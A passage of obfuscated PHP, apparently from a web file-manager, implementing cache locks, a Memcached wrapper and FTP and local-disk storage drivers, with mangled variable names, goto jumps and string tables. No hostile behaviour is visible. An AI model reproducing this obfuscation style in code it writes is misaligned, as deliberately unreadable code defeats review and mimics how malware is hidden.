(IO::exist($’¿ë­œ)) { return !0; } $ŠÂ„¦ÓÕ = get_path_father($’¿ë­œ); if (IO::exist($ŠÂ„¦ÓÕ)) { $ƒ¡Óõ°Ä[] = $ÚßèÅş[$ü˜î„¯¸[517]]; return !1; } $Šûı±Âè = array($ü˜î„¯¸[877] => $ÚßèÅş[$ü˜î„¯¸[877]], $ü˜î„¯¸[94] => array($ü˜î„¯¸[435], "{$ŠÂ„¦ÓÕ}\45")); $æÀŸş’Ë = Model($ü˜î„¯¸[849])->where($Šûı±Âè)->field($ü˜î„¯¸[518])->select(); $ƒ¡Óõ°Ä = array_merge($ƒ¡Óõ°Ä, array_to_keyvalue($æÀŸş’Ë, $ü˜î„¯¸[12], $ü˜î„¯¸[517])); return !1; } private function _fileFilter($¯¤ŠÜÛÆ) { $·—’¢©· =& $_SERVER[ˆûùúÊ¯]; if (empty($¯¤ŠÜÛÆ)) { return; } $àİæƒ¦‰ = array($·—’¢©·[517] => array($·—’¢©·[7], array_unique($¯¤ŠÜÛÆ))); $Óô‚¼Æ­ = Model($·—’¢©·[885])->where($àİæƒ¦‰)->field($·—’¢©·[190])->select(); foreach ($Óô‚¼Æ­ as $¥úÖÄ) { Model($·—’¢©·[885])->remove($¥úÖÄ[$·—’¢©·[190]], !1); } } private function storeIds() { $®†òÑ± =& $_SERVER[ˆûùúÊ¯]; $ëùœ³ÖÙ = Model($®†òÑ±[827])->listData(); $’ù²›Ñ¾ = array(); $Ãªı†ºœ = $GLOBALS[$®†òÑ±[6]][$®†òÑ±[99]][$®†òÑ±[886]]; foreach ($ëùœ³ÖÙ as $û£¨†Ùî) { $…‘—ÂÓÕ = strtolower($û£¨†Ùî[$®†òÑ±[105]]); if (!isset($Ãªı†ºœ[$…‘—ÂÓÕ])) { continue; } $ÇßÍ¼×» = $®†òÑ±[84] . (isset($Ãªı†ºœ[$…‘—ÂÓÕ]) ? $Ãªı†ºœ[$…‘—ÂÓÕ] : ucfirst($…‘—ÂÓÕ)); if (!class_exists($ÇßÍ¼×»)) { continue; } $’ù²›Ñ¾[] = $û£¨†Ùî[$®†òÑ±[451]]; } return $’ù²›Ñ¾; } } goto C”ÖéÌï‰; D÷Ó§ò¤×ğ: class CacheLockMemcached { public function lock($›ØáĞ½¢, $©€÷–®ä = 0) { $ìØÓş¨‚ = Cache::init(); $”¼Ÿ·¢ = microtime(!0) + $©€÷–®ä; while (microtime(!0) < $”¼Ÿ·¢) { $Ôğ×İ¢ = $ìØÓş¨‚->get($›ØáĞ½¢); if (!$Ôğ×İ¢ || $Ôğ×İ¢ < microtime(!0)) { $Íª·§£ì = $ìØÓş¨‚->handle->add($›ØáĞ½¢, $”¼Ÿ·¢, $©€÷–®ä); if ($Íª·§£ì) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($®òÄ“û) { return Cache::init()->get($®òÄ“û); } public function unlock($³İˆĞ¶Ô) { return Cache::init()->remove($³İˆĞ¶Ô); } } class CacheLockDatabase { public function lock($ÔŒ·ƒ‰Ë, $óåı = 0) { $¡´ÂÅç = Model($_SERVER[ˆûùúÊ¯][889]); $Œ¢¬ê®Ò = microtime(!0) + $óåı; while (microtime(!0) < $Œ¢¬ê®Ò) { $Éæ»ÇÅÂ = $¡´ÂÅç->get($ÔŒ·ƒ‰Ë); if (!$Éæ»ÇÅÂ || $Éæ»ÇÅÂ < microtime(!0)) { $éƒ‚À— = $¡´ÂÅç->set($ÔŒ·ƒ‰Ë, $Œ¢¬ê®Ò); if ($éƒ‚À—) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¾¶ã‡÷³) { return Model($_SERVER[ˆûùúÊ¯][889])->get($¾¶ã‡÷³); } public function unlock($‹ßÒ»´–) { Model($_SERVER[ˆûùúÊ¯][889])->remove($‹ßÒ»´–); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ÿ¦óú , $“÷ÙÂè£) { $İã„½ =& $_SERVER[ˆûùúÊ¯]; if (!class_exists($İã„½[927])) { show_json($İã„½[928], !1); } $this->cacheTime = $“÷ÙÂè£; $this->handle = new Memcached(); if (is_array($Ÿ¦óú [$İã„½[929]]) && count($Ÿ¦óú [$İã„½[929]]) >= 1) { foreach ($Ÿ¦óú [$İã„½[929]] as $ê£†ªé·) { $©Ê€ä§ù = explode($İã„½[4], $ê£†ªé·); $this->handle->addServer($©Ê€ä§ù[0], $©Ê€ä§ù[1]); } } else { $this->handle->addServer($Ÿ¦óú [$İã„½[205]], $Ÿ¦óú [$İã„½[206]]); } } public function set($ùÜ„àò”, $ù ±±î¸, $­ä‰ÓÜ» = false) { $­ä‰ÓÜ» = $­ä‰ÓÜ» ? $­ä‰ÓÜ» : $this->cacheTime; return $this->handle->set($ùÜ„àò”, $ù ±±î¸, $­ä‰ÓÜ»); } public function get($ßŒÇùŞÛ) { return $this->handle->get($ßŒÇùŞÛ); } public function remove($±Ìì¦È) { return $this->handle->delete($±Ìì¦È); } public function deleteAll() { return $this->handle->flush(); } } goto a‚§º¹¤ÓŠ; A¦²‚´Ã¬: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($îŸ¨üõ¹) { parent::__construct(); if (count($îŸ¨üõ¹) > 0) { $this->_init($îŸ¨üõ¹); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ŞÌˆ¼¸–) { $íËöÓ =& $_SERVER[ˆûùúÊ¯]; global $config; $this->appCharset = $config[$íËöÓ[1411]]; $this->systemCharset = $config[$íËöÓ[1412]]; if (isset($ŞÌˆ¼¸–[$íËöÓ[1413]]) && $ŞÌˆ¼¸–[$íËöÓ[1413]]) { $this->systemCharset = $ŞÌˆ¼¸–[$íËöÓ[1413]]; } } public function iconvApp($÷–˜Ä›«) { return $this->iconvTo($÷–˜Ä›«, $this->systemCharset, $this->appCharset); } public function iconvSystem($œØ¹©½ò) { return $this->iconvTo($œØ¹©½ò, $this->appCharset, $this->systemCharset); } public function getPathOuter($¤¿õİ„ï) { $¹íÏåÈÈ =& $_SERVER[ˆûùúÊ¯]; $ãÙÚµŒÀ = $this->iconvApp($this->pathBase); $¤¿õİ„ï = $this->iconvApp($¤¿õİ„ï); if (substr($ãÙÚµŒÀ, 0, 2) == $¹íÏåÈÈ[1339]) { $ãÙÚµŒÀ = BASIC_PATH . substr($ãÙÚµŒÀ, 2); } if (substr($¤¿õİ„ï, 0, 2) == $¹íÏåÈÈ[1339]) { $¤¿õİ„ï = BASIC_PATH . substr($¤¿õİ„ï, 2); } $ãÙÚµŒÀ = KodIO::clear($ãÙÚµŒÀ); $¤¿õİ„ï = KodIO::clear($¤¿õİ„ï); $¤¿õİ„ï = substr($¤¿õİ„ï, strlen($ãÙÚµŒÀ)); if (empty($this->pathDriver)) { return $¤¿õİ„ï; } return $this->pathDriver . $¹íÏåÈÈ[8] . ltrim($¤¿õİ„ï, $¹íÏåÈÈ[8]); } private function _init($íŠãùÉ© = array()) { $ç‚—˜¼ =& $_SERVER[ˆûùúÊ¯]; if (!function_exists($ç‚—˜¼[1414])) { throw new Exception(LNG($ç‚—˜¼[1415])); } $this->config = $íŠãùÉ©; $this->charsetReset($íŠãùÉ©); foreach ($íŠãùÉ© as $€ÔÂüğ => $©ßìãİ©) { if (isset($this->{$€ÔÂüğ})) { $this->{$€ÔÂüğ} = $©ßìãİ©; } } return $this->_login($íŠãùÉ©); } private function _login($á•¯å¾Í) { $‡Ô³Â¾â =& $_SERVER[ˆûùúÊ¯]; static $ŒäÃè = array(); $‚¯¿»£Ì = md5(json_encode($á•¯å¾Í)); if (isset($ŒäÃè[$‚¯¿»£Ì])) { foreach ($ŒäÃè[$‚¯¿»£Ì] as $¥Ç¥ğí© => $Í¡ÌÏ¯¨) { $this->{$¥Ç¥ğí©} = $Í¡ÌÏ¯¨; } return !0; } $ë£‘Æœ’ = parse_url(trim($this->server, $‡Ô³Â¾â[8])); $this->host = $ë£‘Æœ’[$‡Ô³Â¾â[205]]; $¦Œ³â÷ = isset($ë£‘Æœ’[$‡Ô³Â¾â[204]]) && $ë£‘Æœ’[$‡Ô³Â¾â[204]] == $‡Ô³Â¾â[1416] ? !0 : !1; $this->scheme = $¦Œ³â÷ ? $‡Ô³Â¾â[1417] : $‡Ô³Â¾â[1418]; $this->port = isset($ë£‘Æœ’[$‡Ô³Â¾â[206]]) ? $ë£‘Æœ’[$‡Ô³Â¾â[206]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $„ç »·õ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¨‰´ç½õ = $this->pasv == $‡Ô³Â¾â[98] ? !0 : !1; @ftp_pasv($this->connect, $¨‰´ç½õ); $ŒäÃè[$‚¯¿»£Ì] = array($‡Ô³Â¾â[1419] => $this->connect, $‡Ô³Â¾â[205] => $this->host, $‡Ô³Â¾â[204] => $this->scheme, $‡Ô³Â¾â[206] => $this->port); return $„ç »·õ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($èÒ®®á, $ĞŠúõœ = '', $ŞÚü¡´ = REPEAT_RENAME) { if ($this->setContent($èÒ®®á, $ĞŠúõœ)) { return $this->getPathOuter($èÒ®®á); } return !1; } public function mkdir($ˆÓ¡Í¿³, $‚¯Ğüá = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ˆÓ¡Í¿³ = $this->iconvSystem($ˆÓ¡Í¿³); if ($this->_isFolder($ˆÓ¡Í¿³) || @ftp_mkdir($this->connect, $ˆÓ¡Í¿³)) { return $this->getPathOuter($ˆÓ¡Í¿³); } if (!$this->mkdir($this->pathFather($ˆÓ¡Í¿³))) { return !1; } if ($ˆÓ¡Í¿³ = @ftp_mkdir($this->connect, $ˆÓ¡Í¿³)) { return $this->getPathOuter($ˆÓ¡Í¿³); } return !1; } public function copyFile($¡šü‘, $ÙèÜ‚ü«) { if (!$this->_isconn()) { return !1; } $ˆÛ°ä¡± = $this->pathThis($this->iconvSystem($¡šü‘)); $Æı¦›À = $this->tempFile($ˆÛ°ä¡±); $Öó¬Ü¼ = $this->iconvApp($Æı¦›À); $this->download($¡šü‘, $Öó¬Ü¼); $•Õµà­³ = $this->upload($ÙèÜ‚ü«, $Öó¬Ü¼); $this->tempFileRemve($Æı¦›À); return $•Õµà­³; } public function moveFile($Šë”Ï×ë, $ÈÜÅÇã) { if (!$this->_isconn()) { return !1; } $Šë”Ï×ë = $this->iconvSystem($Šë”Ï×ë); $ÈÜÅÇã = $this->iconvSystem($ÈÜÅÇã); $¸œ€ºö = @ftp_rename($this->connect, $Šë”Ï×ë, $ÈÜÅÇã); return $¸œ€ºö ? $this->getPathOuter($ÈÜÅÇã) : !1; } public function delFile($îñ›‚û) { if (!$this->_isconn()) { return !1; } $îñ›‚û = $this->iconvSystem($îñ›‚û); return @ftp_delete($this->connect, $îñ›‚û); } public function delFolder($´ØÀğË²) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ØñüÏúæ = $“¦Şà²‰ = array(); $this->fileList($´ØÀğË², $ØñüÏúæ, $“¦Şà²‰, !0); $this->listItemCache = !0; foreach ($“¦Şà²‰ as $’ÃÏÏîŞ) { $Ô¥µµ© = $this->iconvSystem($’ÃÏÏîŞ[$_SERVER[ˆûùúÊ¯][42]]); $¬ôÍ¿òÑ = @ftp_delete($this->connect, $Ô¥µµ©); if (!$¬ôÍ¿òÑ) { return !1; } } foreach ($ØñüÏúæ as $Ô¥µµ©) { $Ô¥µµ© = $this->iconvSystem($Ô¥µµ©); $¬ôÍ¿òÑ = @ftp_rmdir($this->connect, $Ô¥µµ©); if (!$¬ôÍ¿òÑ) { return !1; } } $´ØÀğË² = $this->iconvSystem($´ØÀğË²); return @ftp_rmdir($this->connect, $´ØÀğË²); } public function rename($ßÛà®”„, $˜ÌÒ“ğÄ) { $üÒ§œŸè =& $_SERVER[ˆûùúÊ¯]; if (!$this->_isconn()) { return !1; } $şÇ¬Øå° = $this->fileNameAuto($this->pathFather($ßÛà®”„), $˜ÌÒ“ğÄ); $şÇ¬Øå° = $this->iconvSystem($şÇ¬Øå°); $ßÛà®”„ = $this->iconvSystem($ßÛà®”„); $¶òÍ„‡ù = $this->pathFather($ßÛà®”„); $ŸÈÇ’­Ñ = rtrim($¶òÍ„‡ù, $üÒ§œŸè[8]) . $üÒ§œŸè[8] . $şÇ¬Øå°; $¥¬ó çŠ = @ftp_rename($this->connect, $ßÛà®”„, $ŸÈÇ’­Ñ); $ŸÈÇ’­Ñ = $this->iconvApp($ŸÈÇ’­Ñ); return $¥¬ó çŠ ? $this->getPathOuter($ŸÈÇ’­Ñ) : !1; } private function folderInfo($Ìı‚øßí, $Æ¬’ÁáÈ = false) { $áÓô„ç =& $_SERVER[ˆûùúÊ¯]; $¸Ï˜·®œ = array($áÓô„ç[42] => $this->pathThis($Ìı‚øßí), $áÓô„ç[94] => $this->getPathOuter($áÓô„ç[8] . $Ìı‚øßí), $áÓô„ç[43] => $áÓô„ç[85]); if ($Æ¬’ÁáÈ) { return $¸Ï˜·®œ; } $¸Ï˜·®œ[$áÓô„ç[224]] = $¸Ï˜·®œ[$áÓô„ç[95]] = 0; $¸Ï˜·®œ[$áÓô„ç[225]] = $¸Ï˜·®œ[$áÓô„ç[226]] = !0; return $¸Ï˜·®œ; } private function fileInfo($ëØ¶ÔùÍ, $¡óÂéï = false, $×÷ÉÓú— = array()) { $Òœ‹’òÏ =& $_SERVER[ˆûùúÊ¯]; $ßËà«€ = array($Òœ‹’òÏ[42] => $this->pathThis($ëØ¶ÔùÍ), $Òœ‹’òÏ[94] => $this->getPathOuter($Òœ‹’òÏ[8] . $ëØ¶ÔùÍ), $Òœ‹’òÏ[43] => $Òœ‹’òÏ[223], $Òœ‹’òÏ[86] => isset($×÷ÉÓú—[$Òœ‹’òÏ[86]]) ? $×÷ÉÓú—[$Òœ‹’òÏ[86]] : 0, $Òœ‹’òÏ[184] => $this->ext($ëØ¶ÔùÍ)); if ($¡óÂéï) { return $ßËà«€; } $ßËà«€[$Òœ‹’òÏ[224]] = $ßËà«€[$Òœ‹’òÏ[95]] = 0; $ßËà«€[$Òœ‹’òÏ[225]] = $ßËà«€[$Òœ‹’òÏ[226]] = !0; $ûÜÇŸ‡è = $this->iconvSystem($ëØ¶ÔùÍ); $ßËà«€[$Òœ‹’òÏ[95]] = @ftp_mdtm($this->connect, $ûÜÇŸ‡è); if (empty($×÷ÉÓú—)) { $×÷ÉÓú— = $this->objectMeta($ëØ¶ÔùÍ); if (!$×÷ÉÓú—) { return $ßËà«€; } } $ßËà«€[$Òœ‹’òÏ[86]] = $×÷ÉÓú—[$Òœ‹’òÏ[86]]; return $ßËà«€; } public function size($£õ­ú¼) { $ÈøŸÜÙ = $this->objectMeta($£õ­ú¼); return $ÈøŸÜÙ ? $ÈøŸÜÙ[$_SERVER[ˆûùúÊ¯][86]] : 0; } public function info($Ô¦ªëº¿) { if ($this->isFile($Ô¦ªëº¿)) { return $this->fileInfo($Ô¦ªëº¿, 0); } else { if ($this->isFolder($Ô¦ªëº¿)) { return $this->folderInfo($Ô¦ªëº¿); } } return !1; } private function fileList($ù¶¨ãò„, &$‹×òÂ¯¢, &$üÌÚ¾û™, $ ÂÜè’Ò = false) { $„ÑÚäã =& $_SERVER[ˆûùúÊ¯]; $ù¶¨ãò„ = $this->iconvSystem($ù¶¨ãò„); if (!$this->isFolder($ù¶¨ãò„)) { return !1; } @ftp_chdir($this->connect, $„ÑÚäã[8]); $ù¶¨ãò„ = rtrim($ù¶¨ãò„, $„ÑÚäã[8]) . $„ÑÚäã[8]; check_abort(); $ååÃœŞ = @ftp_rawlist($this->connect, $ù¶¨ãò„); if (!$ååÃœŞ) { $ååÃœŞ = array(); } $´Ÿñ­³ = array($„ÑÚäã[10] => 1, $„ÑÚäã[1340] => 1); foreach ($ååÃœŞ as $¼‘©®«) { $¶íôï—¾ = $this->_listItem($¼‘©®«); if ($¶íôï—¾[0] == $„ÑÚäã[818]) { continue; } $ã²İÃ„ç = $¶íôï—¾[8]; if (empty($ã²İÃ„ç) && $ã²İÃ„ç !== $„ÑÚäã[221] || isset($´Ÿñ­³[$ã²İÃ„ç])) { continue; } $ã²İÃ„ç = $this->iconvApp($ù¶¨ãò„ . ltrim($ã²İÃ„ç, $„ÑÚäã[8])); $öŸîƒÔ = array($„ÑÚäã[42] => $ã²İÃ„ç, $„ÑÚäã[43] => $„ÑÚäã[223], $„ÑÚäã[86] => $¶íôï—¾[4]); if (substr($¼‘©®«, 0, 1) == $„ÑÚäã[1420]) { $öŸîƒÔ[$„ÑÚäã[43]] = $„ÑÚäã[85]; $öŸîƒÔ[$„ÑÚäã[86]] = 0; } $ñïÁ‚º· = $öŸîƒÔ[$„ÑÚäã[43]] == $„ÑÚäã[85] ? !0 : !1; $this->cacheMethodInfoSet($ã²İÃ„ç, $ñïÁ‚º·, $öŸîƒÔ); if ($ñïÁ‚º·) { $‹×òÂ¯¢[] = $ã²İÃ„ç; if ($ ÂÜè’Ò) { $this->fileList($ã²İÃ„ç, $‹×òÂ¯¢, $üÌÚ¾û™, $ ÂÜè’Ò); } continue; } $üÌÚ¾û™[] = $öŸîƒÔ; } $this->cacheMethodInfoSet($ù¶¨ãò„, !0); } private function _listItem($Úâ¡Ú‡á) { if (empty($Úâ¡Ú‡á)) { return array(); } $‡éü´Ğ = preg_split($_SERVER[ˆûùúÊ¯][1421], $Úâ¡Ú‡á); if (count($‡éü´Ğ) <= 9) { return $‡éü´Ğ; } $‡éü´Ğ[8] = trim(substr($Úâ¡Ú‡á, strpos($Úâ¡Ú‡á, $‡éü´Ğ[7]) + strlen($‡éü´Ğ[7]))); return array_splice($‡éü´Ğ, 0, 9); } public function listPath($Í¢¤çƒ, $Ø¤ËüÉÔ = false) { $¬®ÇÑúì =& $_SERVER[ˆûùúÊ¯]; if (!$this->_isconn()) { return !1; } $ß¸¨¢°€ = $¯Ğõ¢ŠÊ = array(); $this->fileList($Í¢¤çƒ, $ß¸¨¢°€, $¯Ğõ¢ŠÊ); foreach ($ß¸¨¢°€ as $Ş’ƒâˆ¥ => $¯Â¿¶€Ã) { $ß¸¨¢°€[$Ş’ƒâˆ¥] = $this->folderInfo($¯Â¿¶€Ã, $Ø¤ËüÉÔ); } foreach ($¯Ğõ¢ŠÊ as $Ş’ƒâˆ¥ => $¯Â¿¶€Ã) { $¯Ğõ¢ŠÊ[$Ş’ƒâˆ¥] = $this->fileInfo($¯Â¿¶€Ã[$¬®ÇÑúì[42]], $Ø¤ËüÉÔ, $¯Â¿¶€Ã); } return array($¬®ÇÑúì[92] => $ß¸¨¢°€, $¬®ÇÑúì[93] => $¯Ğõ¢ŠÊ); } public function has($¾ÂÆÁÖ, $ŞäœÂÎ = false, $Ç¼ßê­Ö = true) { $‰¸´™à× =& $_SERVER[ˆûùúÊ¯]; $ûöş¿° = $¾¢ÊƒÇÈ = array(); $È¼°¤äÇ = $ŞäœÂÎ ? !0 : !1; $this->fileList($¾ÂÆÁÖ, $ûöş¿°, $¾¢ÊƒÇÈ, $È¼°¤äÇ); if ($ŞäœÂÎ) { return array($‰¸´™à×[232] => count($¾¢ÊƒÇÈ), $‰¸´™à×[233] => count($ûöş¿°)); } if ($Ç¼ßê­Ö) { if (count($¾¢ÊƒÇÈ)) { return !0; } } else { if (count($ûöş¿°)) { return !0; } } return !1; } public function listAll($­ŠŞ­’ò) { $Î»Ê’ô =& $_SERVER[ˆûùúÊ¯]; if (!$this->_isconn()) { return !1; } $ùã¬ïÏŞ = $Ìş©Â‰ = array(); $this->fileList($­ŠŞ­’ò, $ùã¬ïÏŞ, $Ìş©Â‰, !0); $Åü§â€ = array_to_keyvalue($Ìş©Â‰, $Î»Ê’ô[42]); foreach ($ùã¬ïÏŞ as $ş‡°ëÆ“) { if (is_string($ş‡°ëÆ“)) { $Åü§â€[$ş‡°ëÆ“] = array($Î»Ê’ô[86] => 0); } } return $this->listAllFiles($­ŠŞ­’ò, $Åü§â€); } public function getContent($Ç¦ÕŒŠ) { if (!$this->_isconn()) { return !1; } $Ç¦ÕŒŠ = $this->iconvSystem($Ç¦ÕŒŠ); return $this->fileSubstr($Ç¦ÕŒŠ); } public function setContent($ÒñÚ³ï‚, $íò‰«§Ğ = '') { if (!$this->_isconn()) { return !1; } $ù«Æù­‡ = $this->pathThis($this->iconvSystem($ÒñÚ³ï‚)); $½Ê¥şèÛ = $this->tempFile($ù«Æù­‡); file_put_contents($½Ê¥şèÛ, $íò‰«§Ğ); $î¹Ù™Ä¿ = $this->upload($ÒñÚ³ï‚, $this->iconvApp($½Ê¥şèÛ)); $this->tempFileRemve($½Ê¥şèÛ); return $î¹Ù™Ä¿; } public function fileSubstr($í»³—ò, $ŸÉğ„Ş = 0, $à‚Ò±¬« = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($í»³—ò, $ŸÉğ„Ş, $à‚Ò±¬«); } private function ftpRequest($øç½ëî·, $±«ñûóş = 0, $Ò”şÌĞ… = false) { $øç½ëî· = $this->iconvSystem($øç½ëî·); $¹Íğ¨‡Î = $this->scheme . $this->host . $_SERVER[ˆûùúÊ¯][4] . $this->port; $Áå†Û = curl_init(); curl_setopt($Áå†Û, CURLOPT_URL, $¹Íğ¨‡Î . $this->pathEncode($øç½ëî·)); curl_setopt($Áå†Û, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Ò”şÌĞ…) { $ìï™Äåç = $±«ñûóş + $Ò”şÌĞ… - 1; curl_setopt($Áå†Û, CURLOPT_RANGE, "{$±«ñûóş}\x2d{$ìï™Äåç}"); } curl_setopt($Áå†Û, CURLOPT_RETURNTRANSFER, 1); $¦ÊíÎÁÙ = curl_exec($Áå†Û); curl_close($Áå†Û); return $¦ÊíÎÁÙ; } public function upload($¼ï¼Ò»À, $ı’ƒ¾´, $º­÷÷ûï = false, $×ÂÛÈ¾ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¼ï¼Ò»À))) { return !1; } $¼ï¼Ò»À = $this->iconvSystem($¼ï¼Ò»À); $ı’ƒ¾´ = $this->iconvSystem($ı’ƒ¾´); $´áÏÆ˜ = ftp_nb_put($this->connect, $¼ï¼Ò»À, $ı’ƒ¾´, FTP_BINARY); while ($´áÏÆ˜ == FTP_MOREDATA) { $´áÏÆ˜ = ftp_nb_continue($this->connect); } if ($´áÏÆ˜ != FTP_FINISHED) { return !1; } return $this->getPathOuter($¼ï¼Ò»À); } public function download($§–œÃïü, $Í¦£Øğú = '') { if (!$this->_isconn()) { return !1; } $êÀè¼Šè = $this->pathFather($Í¦£Øğú); if (!IO::mkdir($êÀè¼Šè)) { return !1; } $§–œÃïü = $this->iconvSystem($§–œÃïü); $Í¦£Øğú = $this->iconvSystem($Í¦£Øğú); $™ŸŠ¾½Ù = ftp_nb_get($this->connect, $Í¦£Øğú, $§–œÃïü, FTP_BINARY); while ($™ŸŠ¾½Ù == FTP_MOREDATA) { $™ŸŠ¾½Ù = ftp_nb_continue($this->connect); } if ($™ŸŠ¾½Ù != FTP_FINISHED) { return !1; } return $this->iconvApp($Í¦£Øğú); } public function exist($ñÉ¼©) { return $this->isFile($ñÉ¼©) || $this->isFolder($ñÉ¼©); } public function isFile($×ıÙĞ‘) { return !$this->isFolder($×ıÙĞ‘) && $this->objectMeta($×ıÙĞ‘); } public function isFolder($Ô‡ö¹‘) { return $this->cacheMethod($_SERVER[ˆûùúÊ¯][175], $Ô‡ö¹‘); } protected function objectMeta($ƒí£Åâ) { return $this->cacheMethod($_SERVER[ˆûùúÊ¯][177], $ƒí£Åâ); } protected function _objectMeta($Á•©ƒ·á) { $àä‘»ùú =& $_SERVER[ˆûùúÊ¯]; if ($Á•©ƒ·á == $àä‘»ùú[12] || $Á•©ƒ·á == $àä‘»ùú[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Á•©ƒ·á = $this->iconvSystem($Á•©ƒ·á); $Ñ¬û› = array($àä‘»ùú[42] => $this->iconvApp($Á•©ƒ·á), $àä‘»ùú[43] => $àä‘»ùú[223], $àä‘»ùú[86] => 0); @ftp_chdir($this->connect, $àä‘»ùú[8]); $‰œ¹¾õ = @ftp_size($this->connect, $Á•©ƒ·á); if ($‰œ¹¾õ != -1) { $Ñ¬û›[$àä‘»ùú[86]] = $‰œ¹¾õ; } else { $ÄñãÜÚ = @ftp_chdir($this->connect, $Á•©ƒ·á); if (!$ÄñãÜÚ) { return !1; } $Ñ¬û›[$àä‘»ùú[43]] = $àä‘»ùú[85]; } return $Ñ¬û›; } protected function _isFolder($Ùû…Ü¸ğ) { $Ì™‘ùÑ =& $_SERVER[ˆûùúÊ¯]; if ($Ùû…Ü¸ğ == $Ì™‘ùÑ[12] || $Ùû…Ü¸ğ == $Ì™‘ùÑ[8]) { return !0; } $Ä°İçœä = $this->_objectMeta($Ùû…Ü¸ğ); return isset($Ä°İçœä[$Ì™‘ùÑ[43]]) && $Ä°İçœä[$Ì™‘ùÑ[43]] == $Ì™‘ùÑ[85] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($›Ç¨Üçã) { if (substr($›Ç¨Üçã, 0, 2) == $_SERVER[ˆûùúÊ¯][1339]) { $›Ç¨Üçã = BASIC_PATH . substr($›Ç¨Üçã, 2); } return $›Ç¨Üçã; } public function iconvApp($º€ç‰èç) { $ƒ²§ô¦Û =& $_SERVER[ˆûùúÊ¯]; global $config; return $this->iconvTo($º€ç‰èç, $config[$ƒ²§ô¦Û[1412]], $config[$ƒ²§ô¦Û[1411]]); } public function iconvSystem($¥«—…ıç) { $ÌÆ¥ÙöÕ =& $_SERVER[ˆûùúÊ¯]; global $config; return $this->iconvTo($¥«—…ıç, $config[$ÌÆ¥ÙöÕ[1411]], $config[$ÌÆ¥ÙöÕ[1412]]); } public function getPathOuter($¤Ç¡•ÏÎ) { $ëÕ¿ºŞ =& $_SERVER[ˆûùúÊ¯]; $¸Ã”êÑÔ = $this->iconvApp($this->pathBase); $¤Ç¡•ÏÎ = $this->iconvApp($¤Ç¡•ÏÎ); if (substr($¸Ã”êÑÔ, 0, 2) == $ëÕ¿ºŞ[1339]) { $¸Ã”êÑÔ = BASIC_PATH . substr($¸Ã”êÑÔ, 2); } if (substr($¤Ç¡•ÏÎ, 0, 2) == $ëÕ¿ºŞ[1339]) { $¤Ç¡•ÏÎ = BASIC_PATH . substr($¤Ç¡•ÏÎ, 2); } $¸Ã”êÑÔ = KodIO::clear($¸Ã”êÑÔ); $¤Ç¡•ÏÎ = KodIO::clear($¤Ç¡•ÏÎ); $¤Ç¡•ÏÎ = substr($¤Ç¡•ÏÎ, strlen($¸Ã”êÑÔ)); if (empty($this->pathDriver)) { return $¤Ç¡•ÏÎ; } return $this->pathDriver . $ëÕ¿ºŞ[8] . ltrim($¤Ç¡•ÏÎ, $ëÕ¿ºŞ[8]); } public function mkfile($€Û¬”Á˜, $œùÏÅä¤ = '', $ÍÉÎìœô = REPEAT_RENAME) { $€Û¬”Á˜ = $this->iconvSystem($€Û¬”Á˜); @touch($€Û¬”Á˜); if ($œùÏÅä¤) { file_put_contents($€Û¬”Á˜, $œùÏÅä¤); } @chmod($€Û¬”Á˜, $this->pathAuth); return is_file($€Û¬”Á˜) ? $this->getPathOuter($€Û¬”Á˜) : !1; } public function mkdir($¦Ùµ€¦, $Æâ€Ëå = REPEAT_SKIP) { $¦Ùµ€¦ = $this->iconvSystem($¦Ùµ€¦); if (is_dir($¦Ùµ€¦)) { return $this->getPathOuter($¦Ùµ€¦); } @mkdir($¦Ùµ€¦, $this->pathAuth, !0); @chmod($¦Ùµ€¦, $this->pathAuth); return is_dir($¦Ùµ€¦) ? $this->getPathOuter($¦Ùµ€¦) : !1; } public function copyFile($Øä«ğ, $¢­úÂİ) { $this->mkdir($this->pathFather($¢­úÂİ)); $Øä«ğ = $this->iconvSystem($Øä«ğ); $¢­úÂİ = $this->iconvSystem($¢­úÂİ); $åÌé = copy_64($Øä«ğ, $¢­úÂİ); @chmod($¢­úÂİ, $this->pathAuth); return $åÌé ? $this->getPathOuter($¢­úÂİ) : !1; } public function moveFile($Òà»‘Ü, $Š®ë‚‡) { $this->mkdir($this->pathFather($Š®ë‚‡)); $Òà»‘Ü = $this->iconvSystem($Òà»‘Ü); $Š®ë‚‡ = $this->iconvSystem($Š®ë‚‡); $›©Å©¿Ê = intval(@rename($Òà»‘Ü, $Š®ë‚‡)); if (!$›©Å©¿Ê) { if ($›©Å©¿Ê = intval(@copy_64($Òà»‘Ü, $Š®ë‚‡))) { @unlink($Òà»‘Ü); } } @chmod($Š®ë‚‡, $this->pathAuth); return $›©Å©¿Ê ? $this->getPathOuter($Š®ë‚‡) : !1; } public function movePath($©±…Ù, $ººÕ’š, $Í¨Î·ú‰ = false) { $“ù†êÅú =& $_SERVER[ˆûùúÊ¯]; $©±…Ù = $this->iconvSystem($©±…Ù); $ººÕ’š = $this->iconvSystem($ººÕ’š); $à¡‹Ğôê = rtrim($ººÕ’š, $“ù†êÅú[8]) . $“ù†êÅú[8] . ($Í¨Î·ú‰ ? $Í¨Î·ú‰ : get_path_this($©±…Ù)); if (file_exists($à¡‹Ğôê)) { return !1; } $Ñù·¯Øë = intval(@rename($©±…Ù, $à¡‹Ğôê)); $Ñù·¯Øë = file_exists($à¡‹Ğôê); return $Ñù·¯Øë ? $this->getPathOuter($à¡‹Ğôê) : !1; } public function 